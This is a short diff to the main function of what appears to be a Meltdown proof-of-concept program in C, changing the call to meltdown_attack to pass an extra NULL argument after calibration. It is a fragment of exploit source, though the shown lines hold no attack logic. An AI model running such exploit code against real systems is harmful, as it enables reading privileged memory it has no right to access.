@@ -154,7 +154,7 @@ main(int argc, char *argv[])
 	meltdown_calibrate();
 
 	/* perform the attack */
-	meltdown_attack(atk_addr, atk_len, atk_rounds);
+	meltdown_attack(atk_addr, NULL, atk_len, atk_rounds);
 
 	exit(0);
 }
